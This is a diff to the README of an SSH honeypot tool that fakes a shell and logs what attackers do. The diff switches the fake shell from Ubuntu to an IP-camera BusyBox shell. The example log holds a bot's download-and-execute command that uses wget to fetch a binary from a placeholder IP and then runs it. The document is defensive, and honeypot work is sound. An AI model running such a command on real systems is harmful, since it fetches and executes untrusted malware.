@@ -2,9 +2,9 @@
 
 A fake SSH server that catches bots.
 
-Anyone can log in with any password or key. They get a shell that looks like a real
-Ubuntu server, but nothing is real: every command is faked, files live in memory, and
-nothing ever runs on your machine.
+Anyone can log in with any password or key. They get the BusyBox shell of a cheap IP
+camera, but nothing is real: every command is faked, files live in memory, and nothing
+ever runs on your machine.
 
 Meanwhile, ssham writes down everything they do.
 
@@ -25,8 +25,8 @@ ssh -p 2222 root@localhost
 
 ```json
 {"msg":"auth","user":"root","password":"123456"}
-{"msg":"input","line":"cd /tmp; wget http://1.2.3.4/bot; chmod +x bot; ./bot"}
-{"msg":"download","url":"http://1.2.3.4/bot"}
+{"msg":"input","line":"cd /tmp; wget http://1.2.3.4/bot.arm7; chmod +x bot.arm7; ./bot.arm7"}
+{"msg":"download","url":"http://1.2.3.4/bot.arm7"}
 ```
 
 The bot sees `Segmentation fault`. You see the bot's URL.
